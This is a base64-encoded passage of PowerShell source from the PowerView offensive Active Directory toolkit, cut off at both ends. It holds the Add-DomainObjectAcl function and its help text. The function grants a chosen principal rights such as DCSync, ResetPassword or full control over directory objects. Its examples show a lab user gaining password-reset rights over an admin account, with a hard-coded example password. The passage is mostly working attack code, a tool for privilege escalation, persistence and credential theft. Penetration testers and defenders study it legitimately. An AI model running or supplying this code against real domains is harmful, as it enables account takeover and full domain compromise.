YXRjaCB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5PYmplY3RBY2xdIEVycm9yOiAkXyIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQoKCmZ1bmN0aW9uIEFkZC1Eb21haW5PYmplY3RBY2wgewo8IwouU1lOT1BTSVMKCkFkZHMgYW4gQUNMIGZvciBhIHNwZWNpZmljIGFjdGl2ZSBkaXJlY3Rvcnkgb2JqZWN0LgoKQWRtaW5TREhvbGRlciBBQ0wgYXBwcm9hY2ggZnJvbSBTZWFuIE1ldGNhbGYgKEBweXJvdGVrMyk6IGh0dHBzOi8vYWRzZWN1cml0eS5vcmcvP3A9MTkwNgoKQXV0aG9yOiBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBHZXQtRG9tYWluT2JqZWN0ICAKCi5ERVNDUklQVElPTgoKVGhpcyBmdW5jdGlvbiBtb2RpZmllcyB0aGUgQUNML0FDRSBlbnRyaWVzIGZvciBhIGdpdmVuIEFjdGl2ZSBEaXJlY3RvcnkKdGFyZ2V0IG9iamVjdCBzcGVjaWZpZWQgYnkgLVRhcmdldElkZW50aXR5LiBBdmFpbGFibGUgLVJpZ2h0cyBhcmUKJ0FsbCcsICdSZXNldFBhc3N3b3JkJywgJ1dyaXRlTWVtYmVycycsICdEQ1N5bmMnLCBvciBhIG1hbnVhbCBleHRlbmRlZApyaWdodHMgR1VJRCBjYW4gYmUgc2V0IHdpdGggLVJpZ2h0c0dVSUQuIFRoZXNlIHJpZ2h0cyBhcmUgZ3JhbnRlZCBvbiB0aGUgdGFyZ2V0Cm9iamVjdCBmb3IgdGhlIHNwZWNpZmllZCAtUHJpbmNpcGFsSWRlbnRpdHkuCgouUEFSQU1FVEVSIFRhcmdldElkZW50aXR5CgpBIFNhbUFjY291bnROYW1lIChlLmcuIGhhcm1qMHkpLCBEaXN0aW5ndWlzaGVkTmFtZSAoZS5nLiBDTj1oYXJtajB5LENOPVVzZXJzLERDPXRlc3RsYWIsREM9bG9jYWwpLApTSUQgKGUuZy4gUy0xLTUtMjEtODkwMTcxODU5LTM0MzM4MDkyNzktMzM2NjE5Njc1My0xMTA4KSwgb3IgR1VJRCAoZS5nLiA0YzQzNWRkNy1kYzU4LTRiMTQtOWE1ZS0xZmRiMGU4MGQyMDEpCmZvciB0aGUgZG9tYWluIG9iamVjdCB0byBtb2RpZnkgQUNMcyBmb3IuIFJlcXVpcmVkLiBXaWxkY2FyZHMgYWNjZXB0ZWQuCgouUEFSQU1FVEVSIFRhcmdldERvbWFpbgoKU3BlY2lmaWVzIHRoZSBkb21haW4gZm9yIHRoZSBUYXJnZXRJZGVudGl0eSB0byB1c2UgZm9yIHRoZSBtb2RpZmljYXRpb24sIGRlZmF1bHRzIHRvIHRoZSBjdXJyZW50IGRvbWFpbi4KCi5QQVJBTUVURVIgVGFyZ2V0TERBUEZpbHRlcgoKU3BlY2lmaWVzIGFuIExEQVAgcXVlcnkgc3RyaW5nIHRoYXQgaXMgdXNlZCB0byBmaWx0ZXIgQWN0aXZlIERpcmVjdG9yeSBvYmplY3QgdGFyZ2V0cy4KCi5QQVJBTUVURVIgVGFyZ2V0U2VhcmNoQmFzZQoKVGhlIExEQVAgc291cmNlIHRvIHNlYXJjaCB0aHJvdWdoIGZvciB0YXJnZXRzLCBlLmcuICJMREFQOi8vT1U9c2VjcmV0LERDPXRlc3RsYWIsREM9bG9jYWwiClVzZWZ1bCBmb3IgT1UgcXVlcmllcy4KCi5QQVJBTUVURVIgUHJpbmNpcGFsSWRlbnRpdHkKCkEgU2FtQWNjb3VudE5hbWUgKGUuZy4gaGFybWoweSksIERpc3Rpbmd1aXNoZWROYW1lIChlLmcuIENOPWhhcm1qMHksQ049VXNlcnMsREM9dGVzdGxhYixEQz1sb2NhbCksClNJRCAoZS5nLiBTLTEtNS0yMS04OTAxNzE4NTktMzQzMzgwOTI3OS0zMzY2MTk2NzUzLTExMDgpLCBvciBHVUlEIChlLmcuIDRjNDM1ZGQ3LWRjNTgtNGIxNC05YTVlLTFmZGIwZTgwZDIwMSkKZm9yIHRoZSBkb21haW4gcHJpbmNpcGFsIHRvIGFkZCBmb3IgdGhlIEFDTC4gUmVxdWlyZWQuIFdpbGRjYXJkcyBhY2NlcHRlZC4KCi5QQVJBTUVURVIgUHJpbmNpcGFsRG9tYWluCgpTcGVjaWZpZXMgdGhlIGRvbWFpbiBmb3IgdGhlIFRhcmdldElkZW50aXR5IHRvIHVzZSBmb3IgdGhlIHByaW5jaXBhbCwgZGVmYXVsdHMgdG8gdGhlIGN1cnJlbnQgZG9tYWluLgoKLlBBUkFNRVRFUiBQcmluY2lwYWxMREFQRmlsdGVyCgpTcGVjaWZpZXMgYW4gTERBUCBxdWVyeSBzdHJpbmcgdGhhdCBpcyB1c2VkIHRvIGZpbHRlciBmb3IgdGhlIEFjdGl2ZSBEaXJlY3Rvcnkgb2JqZWN0IHByaW5jaXBhbC4KCi5QQVJBTUVURVIgUHJpbmNpcGFsU2VhcmNoQmFzZQoKVGhlIExEQVAgc291cmNlIHRvIHNlYXJjaCB0aHJvdWdoIGZvciBwcmluY2lwYWxzLCBlLmcuICJMREFQOi8vT1U9c2VjcmV0LERDPXRlc3RsYWIsREM9bG9jYWwiClVzZWZ1bCBmb3IgT1UgcXVlcmllcy4KCi5QQVJBTUVURVIgU2VydmVyCgpTcGVjaWZpZXMgYW4gQWN0aXZlIERpcmVjdG9yeSBzZXJ2ZXIgKGRvbWFpbiBjb250cm9sbGVyKSB0byBiaW5kIHRvLgoKLlBBUkFNRVRFUiBTZWFyY2hTY29wZQoKU3BlY2lmaWVzIHRoZSBzY29wZSB0byBzZWFyY2ggdW5kZXIsIEJhc2UvT25lTGV2ZWwvU3VidHJlZSAoZGVmYXVsdCBvZiBTdWJ0cmVlKS4KCi5QQVJBTUVURVIgUmVzdWx0UGFnZVNpemUKClNwZWNpZmllcyB0aGUgUGFnZVNpemUgdG8gc2V0IGZvciB0aGUgTERBUCBzZWFyY2hlciBvYmplY3QuCgouUEFSQU1FVEVSIFNlcnZlclRpbWVMaW1pdAoKU3BlY2lmaWVzIHRoZSBtYXhpbXVtIGFtb3VudCBvZiB0aW1lIHRoZSBzZXJ2ZXIgc3BlbmRzIHNlYXJjaGluZy4gRGVmYXVsdCBvZiAxMjAgc2Vjb25kcy4KCi5QQVJBTUVURVIgVG9tYnN0b25lCgpTd2l0Y2guIFNwZWNpZmllcyB0aGF0IHRoZSBzZWFyY2hlciBzaG91bGQgYWxzbyByZXR1cm4gZGVsZXRlZC90b21ic3RvbmVkIG9iamVjdHMuCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKCkEgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdIG9iamVjdCBvZiBhbHRlcm5hdGUgY3JlZGVudGlhbHMKZm9yIGNvbm5lY3Rpb24gdG8gdGhlIHRhcmdldCBkb21haW4uCgouUEFSQU1FVEVSIFJpZ2h0cwoKUmlnaHRzIHRvIGFkZCBmb3IgdGhlIHByaW5jaXBhbCwgJ0FsbCcsICdSZXNldFBhc3N3b3JkJywgJ1dyaXRlTWVtYmVycycsICdEQ1N5bmMnLgpEZWZhdWx0cyB0byAnQWxsJy4KCi5QQVJBTUVURVIgUmlnaHRzR1VJRAoKTWFudWFsIEdVSUQgcmVwcmVzZW50aW5nIHRoZSByaWdodCB0byBhZGQgdG8gdGhlIHRhcmdldC4KCi5FWEFNUExFCgokSGFybWoweVNpZCA9IEdldC1Eb21haW5Vc2VyIGhhcm1qMHkgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBvYmplY3RzaWQKR2V0LURvbWFpbk9iamVjdEFDTCBkZm0uYSAtUmVzb2x2ZUdVSURzIHwgV2hlcmUtT2JqZWN0IHskXy5zZWN1cml0eWlkZW50aWZpZXIgLWVxICRIYXJtajB5U2lkfQoKLi4uCgpBZGQtRG9tYWluT2JqZWN0QWNsIC1UYXJnZXRJZGVudGl0eSBkZm0uYSAtUHJpbmNpcGFsSWRlbnRpdHkgaGFybWoweSAtUmlnaHRzIFJlc2V0UGFzc3dvcmQgLVZlcmJvc2UKVkVSQk9TRTogW0dldC1Eb21haW5TZWFyY2hlcl0gc2VhcmNoIHN0cmluZzogTERBUDovL1BSSU1BUlkudGVzdGxhYi5sb2NhbC9EQz10ZXN0bGFiLERDPWxvY2FsClZFUkJPU0U6IFtHZXQtRG9tYWluT2JqZWN0XSBHZXQtRG9tYWluT2JqZWN0IGZpbHRlciBzdHJpbmc6ICgmKHwoc2FtQWNjb3VudE5hbWU9aGFybWoweSkpKQpWRVJCT1NFOiBbR2V0LURvbWFpblNlYXJjaGVyXSBzZWFyY2ggc3RyaW5nOiBMREFQOi8vUFJJTUFSWS50ZXN0bGFiLmxvY2FsL0RDPXRlc3RsYWIsREM9bG9jYWwKVkVSQk9TRTogW0dldC1Eb21haW5PYmplY3RdIEdldC1Eb21haW5PYmplY3QgZmlsdGVyIHN0cmluZzooJih8KHNhbUFjY291bnROYW1lPWRmbS5hKSkpClZFUkJPU0U6IFtBZGQtRG9tYWluT2JqZWN0QWNsXSBHcmFudGluZyBwcmluY2lwYWwgQ049aGFybWoweSxDTj1Vc2VycyxEQz10ZXN0bGFiLERDPWxvY2FsICdSZXNldFBhc3N3b3JkJyBvbiBDTj1kZm0gKGFkbWluKSxDTj1Vc2VycyxEQz10ZXN0bGFiLERDPWxvY2FsClZFUkJPU0U6IFtBZGQtRG9tYWluT2JqZWN0QWNsXSBHcmFudGluZyBwcmluY2lwYWwgQ049aGFybWoweSxDTj1Vc2VycyxEQz10ZXN0bGFiLERDPWxvY2FsIHJpZ2h0cyBHVUlEICcwMDI5OTU3MC0yNDZkLTExZDAtYTc2OC0wMGFhMDA2ZTA1MjknIG9uIENOPWRmbSAoYWRtaW4pLENOPVVzZXJzLERDPXRlc3RsYWIsREM9bG9jYWwKCkdldC1Eb21haW5PYmplY3RBQ0wgZGZtLmEgLVJlc29sdmVHVUlEcyB8IFdoZXJlLU9iamVjdCB7JF8uc2VjdXJpdHlpZGVudGlmaWVyIC1lcSAkSGFybWoweVNpZCB9CgpBY2VRdWFsaWZpZXIgICAgICAgICAgIDogQWNjZXNzQWxsb3dlZApPYmplY3RETiAgICAgICAgICAgICAgIDogQ049ZGZtIChhZG1pbiksQ049VXNlcnMsREM9dGVzdGxhYixEQz1sb2NhbApBY3RpdmVEaXJlY3RvcnlSaWdodHMgIDogRXh0ZW5kZWRSaWdodApPYmplY3RBY2VUeXBlICAgICAgICAgIDogVXNlci1Gb3JjZS1DaGFuZ2UtUGFzc3dvcmQKT2JqZWN0U0lEICAgICAgICAgICAgICA6IFMtMS01LTIxLTg5MDE3MTg1OS0zNDMzODA5Mjc5LTMzNjYxOTY3NTMtMTExNApJbmhlcml0YW5jZUZsYWdzICAgICAgIDogTm9uZQpCaW5hcnlMZW5ndGggICAgICAgICAgIDogNTYKQWNlVHlwZSAgICAgICAgICAgICAgICA6IEFjY2Vzc0FsbG93ZWRPYmplY3QKT2JqZWN0QWNlRmxhZ3MgICAgICAgICA6IE9iamVjdEFjZVR5cGVQcmVzZW50CklzQ2FsbGJhY2sgICAgICAgICAgICAgOiBGYWxzZQpQcm9wYWdhdGlvbkZsYWdzICAgICAgIDogTm9uZQpTZWN1cml0eUlkZW50aWZpZXIgICAgIDogUy0xLTUtMjEtODkwMTcxODU5LTM0MzM4MDkyNzktMzM2NjE5Njc1My0xMTA4CkFjY2Vzc01hc2sgICAgICAgICAgICAgOiAyNTYKQXVkaXRGbGFncyAgICAgICAgICAgICA6IE5vbmUKSXNJbmhlcml0ZWQgICAgICAgICAgICA6IEZhbHNlCkFjZUZsYWdzICAgICAgICAgICAgICAgOiBOb25lCkluaGVyaXRlZE9iamVjdEFjZVR5cGUgOiBBbGwKT3BhcXVlTGVuZ3RoICAgICAgICAgICA6IDAKCi5FWEFNUExFCgokSGFybWoweVNpZCA9IEdldC1Eb21haW5Vc2VyIGhhcm1qMHkgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBvYmplY3RzaWQKR2V0LURvbWFpbk9iamVjdEFDTCB0ZXN0dXNlciAtUmVzb2x2ZUdVSURzIHwgV2hlcmUtT2JqZWN0IHskXy5zZWN1cml0eWlkZW50aWZpZXIgLWVxICRIYXJtajB5U2lkfQoKW25vIHJlc3VsdHMgcmV0dXJuZWRdCgokU2VjUGFzc3dvcmQgPSBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nICdQYXNzd29yZDEyMyEnLUFzUGxhaW5UZXh0IC1Gb3JjZQokQ3JlZCA9IE5ldy1PYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwoJ1RFU1RMQUJcZGZtLmEnLCAkU2VjUGFzc3dvcmQpCkFkZC1Eb21haW5PYmplY3RBY2wgLVRhcmdldElkZW50aXR5IHRlc3R1c2VyIC1QcmluY2lwYWxJZGVudGl0eSBoYXJtajB5IC1SaWdodHMgUmVzZXRQYXNzd29yZCAtQ3JlZGVudGlhbCAkQ3JlZCAtVmVyYm9zZQpWRVJCT1NFOiBbR2V0LURvbWFpbl0gVXNpbmcgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzIGZvciBHZXQtRG9tYWluClZFUkJPU0U6IFtHZXQtRG9tYWluXSBFeHRyYWN0ZWQgZG9tYWluICdURVNUTEFCJyBmcm9tIC1DcmVkZW50aWFsClZFUkJPU0U6IFtHZXQtRG9tYWluU2VhcmNoZXJdIHNlYXJjaCBzdHJpbmc6IExEQVA6Ly9QUklNQVJZLnRlc3RsYWIubG9jYWwvREM9dGVzdGxhYixEQz1sb2NhbApWRVJCT1NFOiBbR2V0LURvbWFpblNlYXJjaGVyXSBVc2luZyBhbHRlcm5hdGUgY3JlZGVudGlhbHMgZm9yIExEQVAgY29ubmVjdGlvbgpWRVJCT1NFOiBbR2V0LURvbWFpbk9iamVjdF0gR2V0LURvbWFpbk9iamVjdCBmaWx0ZXIgc3RyaW5nOiAoJih8KHwoc2FtQWNjb3VudE5hbWU9aGFybWoweSkobmFtZT1oYXJtajB5KSkpKQpWRVJCT1NFOiBbR2V0LURvbWFpbl0gVXNpbmcgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzIGZvciBHZXQtRG9tYWluClZFUkJPU0U6IFtHZXQtRG9tYWluXSBFeHRyYWN0ZWQgZG9tYWluICdURVNUTEFCJyBmcm9tIC1DcmVkZW50aWFsClZFUkJPU0U6IFtHZXQtRG9tYWluU2VhcmNoZXJdIHNlYXJjaCBzdHJpbmc6IExEQVA6Ly9QUklNQVJZLnRlc3RsYWIubG9jYWwvREM9dGVzdGxhYixEQz1sb2NhbApWRVJCT1NFOiBbR2V0LURvbWFpblNlYXJjaGVyXSBVc2luZyBhbHRlcm5hdGUgY3JlZGVudGlhbHMgZm9yIExEQVAgY29ubmVjdGlvbgpWRVJCT1NFOiBbR2V0LURvbWFpbk9iamVjdF0gR2V0LURvbWFpbk9iamVjdCBmaWx0ZXIgc3RyaW5nOiAoJih8KHwoc2FtQWNjb3VudE5hbWU9dGVzdHVzZXIpKG5hbWU9dGVzdHVzZXIpKSkpClZFUkJPU0U6IFtBZGQtRG9tYWluT2JqZWN0QWNsXSBHcmFudGluZyBwcmluY2lwYWwgQ049aGFybWoweSxDTj1Vc2VycyxEQz10ZXN0bGFiLERDPWxvY2FsICdSZXNldFBhc3N3b3JkJyBvbiBDTj10ZXN0dXNlciB0ZXN0dXNlcixDTj1Vc2VycyxEQz10ZXN0bGFiLERDPWxvY2FsClZFUkJPU0U6IFtBZGQtRG9tYWluT2JqZWN0QWNsXSBHcmFudGluZyBwcmluY2lwYWwgQ049aGFybWoweSxDTj1Vc2VycyxEQz10ZXN0bGFiLERDPWxvY2FsIHJpZ2h0cyBHVUlEICcwMDI5OTU3MC0yNDZkLTExZDAtYTc2OC0wMGFhMDA2ZTA1MjknIG9uIENOPXRlc3R1c2VyLENOPVVzZXJzLERDPXRlc3RsYWIsREM9bG9jYWwKCkdldC1Eb21haW5PYmplY3RBQ0wgdGVzdHVzZXIgLVJlc29sdmVHVUlEcyB8IFdoZXJlLU9iamVjdCB7JF8uc2VjdXJpdHlpZGVudGlmaWVyIC1lcSAkSGFybWoweVNpZCB9CgpBY2VRdWFsaWZpZXIgICAgICAgICAgIDogQWNjZXNzQWxsb3dlZApPYmplY3RETiAgICAgICAgICAgICAgIDogQ049ZGZtIChhZG1pbiksQ049VXNlcnMsREM9dGVzdGxhYixEQz1sb2NhbApBY3RpdmVEaXJlY3RvcnlSaWdodHMgIDogRXh0ZW5kZWRSaWdodApPYmplY3RBY2VUeXBlICAgICAgICAgIDogVXNlci1Gb3JjZS1DaGFuZ2UtUGFzc3dvcmQKT2JqZWN0U0lEICAgICAgICAgICAgICA6IFMtMS01LTIxLTg5MDE3MTg1OS0zNDMzODA5Mjc5LTMzNjYxOTY3NTMtMTExNApJbmhlcml0YW5jZUZsYWdzICAgICAgIDogTm9uZQpCaW5hcnlMZW5ndGggICAgICAgICAgIDogNTYKQWNlVHlwZSAgICAgICAgICAgICAgICA6IEFjY2Vzc0FsbG93ZWRPYmplY3QKT2JqZWN0QWNlRmxhZ3MgICAgICAgICA6IE9iamVjdEFjZVR5cGVQcmVzZW50CklzQ2FsbGJhY2sgICAgICAgICAgICAgOiBGYWxzZQpQcm9wYWdhdGlvbkZsYWdzICAgICAgIDogTm9uZQpTZWN1cml0eUlkZW50aWZpZXIgICAgIDogUy0xLTUtMjEtODkwMTcxODU5LTM0MzM4MDkyNzktMzM2NjE5Njc1My0xMTA4CkFjY2Vzc01hc2sgICAgICAgICAgICAgOiAyNTYKQXVkaXRGbGFncyAgICAgICAgICAgICA6IE5vbmUKSXNJbmhlcml0ZWQgICAgICAgICAgICA6IEZhbHNlCkFjZUZsYWdzICAgICAgICAgICAgICAgOiBOb25lCkluaGVyaXRlZE9iamVjdEFjZVR5cGUgOiBBbGwKT3BhcXVlTGVuZ3RoICAgICAgICAgICA6IDAKCi5MSU5LCgpodHRwczovL2Fkc2VjdXJpdHkub3JnLz9wPTE5MDYKaHR0cHM6Ly9zb2NpYWwudGVjaG5ldC5taWNyb3NvZnQuY29tL0ZvcnVtcy93aW5kb3dzc2VydmVyL2VuLVVTL2RmM2JmZDMzLWMwNzAtNGE5Yy1iZTk4LWM0ZGE2ZTU5MWEwYS9mb3J1bS1mYXEtdXNpbmctcG93ZXJzaGVsbC10by1hc3NpZ24tcGVybWlzc2lvbnMtb24tYWN0aXZlLWRpcmVjdG9yeS1vYmplY3RzP2ZvcnVtPXdpbnNlcnZlcnBvd2Vyc2hlbGwKIz4KCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtICgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0Rpc3Rpbmd1aXNoZWROYW1lJywgJ1NhbUFjY291bnROYW1lJywgJ05hbWUnKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJFRhcmdldElkZW50aXR5LAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFRhcmdldERvbWFpbiwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0ZpbHRlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFRhcmdldExEQVBGaWx0ZXIsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkVGFyZ2V0U2VhcmNoQmFzZSwKCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJFByaW5jaXBhbElkZW50aXR5LAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFByaW5jaXBhbERvbWFpbiwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0RvbWFpbkNvbnRyb2xsZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZXJ2ZXIsCgogICAgICAgIFtWYWxpZGF0ZVNldCgnQmFzZScsICdPbmVMZXZlbCcsICdTdWJ0cmVlJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoU2NvcGUgPSAnU3VidHJlZScsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRSZXN1bHRQYWdlU2l6ZSA9IDIwMCwKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFNlcnZlclRpbWVMaW1pdCwKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVG9tYnN0b25lLAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHksCgogICAgICAgIFtWYWxpZGF0ZVNldCgnQWxsJywgJ1Jlc2V0UGFzc3dvcmQnLCAnV3JpdGVNZW1iZXJzJywgJ0RDU3luYycpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFJpZ2h0cyA9ICdBbGwnLAoKICAgICAgICBbR3VpZF0KICAgICAgICAkUmlnaHRzR1VJRAogICAgKQoKICAgIEJFR0lOIHsKICAgICAgICAkVGFyZ2V0U2VhcmNoZXJBcmd1bWVudHMgPSBAewogICAgICAgICAgICAnUHJvcGVydGllcycgPSAnZGlzdGluZ3Vpc2hlZG5hbWUnCiAgICAgICAgICAgICdSYXcnID0gJFRydWUKICAgICAgICB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVGFyZ2V0RG9tYWluJ10pIHsgJFRhcmdldFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICRUYXJnZXREb21haW4gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RhcmdldExEQVBGaWx0ZXInXSkgeyAkVGFyZ2V0U2VhcmNoZXJBcmd1bWVudHNbJ0xEQVBGaWx0ZXInXSA9ICRUYXJnZXRMREFQRmlsdGVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydUYXJnZXRTZWFyY2hCYXNlJ10pIHsgJFRhcmdldFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hCYXNlJ10gPSAkVGFyZ2V0U2VhcmNoQmFzZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJFRhcmdldFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJFRhcmdldFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hTY29wZSddID0gJFNlYXJjaFNjb3BlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRUYXJnZXRTZWFyY2hlckFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJFRhcmdldFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRUYXJnZXRTZWFyY2hlckFyZ3VtZW50c1snVG9tYnN0b25lJ10gPSAkVG9tYnN0b25lIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFRhcmdldFNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CgogICAgICAgICRQcmluY2lwYWxTZWFyY2hlckFyZ3VtZW50cyA9IEB7CiAgICAgICAgICAgICdJZGVudGl0eScgPSAkUHJpbmNpcGFsSWRlbnRpdHkKICAgICAgICAgICAgJ1Byb3BlcnRpZXMnID0gJ2Rpc3Rpbmd1aXNoZWRuYW1lLG9iamVjdHNpZCcKICAgICAgICB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUHJpbmNpcGFsRG9tYWluJ10pIHsgJFByaW5jaXBhbFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICRQcmluY2lwYWxEb21haW4gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRQcmluY2lwYWxTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hTY29wZSddKSB7ICRQcmluY2lwYWxTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoU2NvcGUnXSA9ICRTZWFyY2hTY29wZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkUHJpbmNpcGFsU2VhcmNoZXJBcmd1bWVudHNbJ1Jlc3VsdFBhZ2VTaXplJ10gPSAkUmVzdWx0UGFnZVNpemUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlclRpbWVMaW1pdCddKSB7ICRQcmluY2lwYWxTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyVGltZUxpbWl0J10gPSAkU2VydmVyVGltZUxpbWl0IH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydUb21ic3RvbmUnXSkgeyAkUHJpbmNpcGFsU2VhcmNoZXJBcmd1bWVudHNbJ1RvbWJzdG9uZSddID0gJFRvbWJzdG9uZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRQcmluY2lwYWxTZWFyY2hlckFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgICAgICRQcmluY2lwYWxzID0gR2V0LURvbWFpbk9iamVjdCBAUHJpbmNpcGFsU2VhcmNoZXJBcmd1bWVudHMKICAgICAgICBpZiAoLW5vdCAkUHJpbmNpcGFscykgewogICAgICAgICAgICB0aHJvdyAiVW5hYmxlIHRvIHJlc29sdmUgcHJpbmNpcGFsOiAkUHJpbmNpcGFsSWRlbnRpdHkiCiAgICAgICAgfQogICAgfQoKICAgIFBST0NFU1MgewogICAgICAgICRUYXJnZXRTZWFyY2hlckFyZ3VtZW50c1snSWRlbnRpdHknXSA9ICRUYXJnZXRJZGVudGl0eQogICAgICAgICRUYXJnZXRzID0gR2V0LURvbWFpbk9iamVjdCBAVGFyZ2V0U2VhcmNoZXJBcmd1bWVudHMKCiAgICAgICAgRm9yRWFjaCAoJFRhcmdldE9iamVjdCBpbiAkVGFyZ2V0cykgewoKICAgICAgICAgICAgJEluaGVyaXRhbmNlVHlwZSA9IFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5U2VjdXJpdHlJbmhlcml0YW5jZV0gJ05vbmUnCiAgICAgICAgICAgICRDb250cm9sVHlwZSA9IFtTeXN0ZW0uU2VjdXJpdHkuQWNjZXNzQ29udHJvbC5BY2Nlc3NDb250cm9sVHlwZV0gJ0FsbG93JwogICAgICAgICAgICAkQUNFcyA9IEAoKQoKICAgICAgICAgICAgaWYgKCRSaWdodHNHVUlEKSB7CiAgICAgICAgICAgICAgICAkR1VJRHMgPSBAKCRSaWdodHNHVUlEKQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgJEdVSURzID0gU3dpdGNoICgkUmlnaHRzKSB7CiAgICAgICAgICAgICAgICAgICAgIyBSZXNldFBhc3N3b3JkIGRvZXNuJ3QgbmVlZCB0byBrbm93IHRoZSB1c2VyJ3MgY3VycmVudCBwYXNzd29yZAogICAgICAgICAgICAgICAgICAgICdSZXNldFBhc3N3b3JkJyB7ICcwMDI5OTU3MC0yNDZkLTExZDAtYT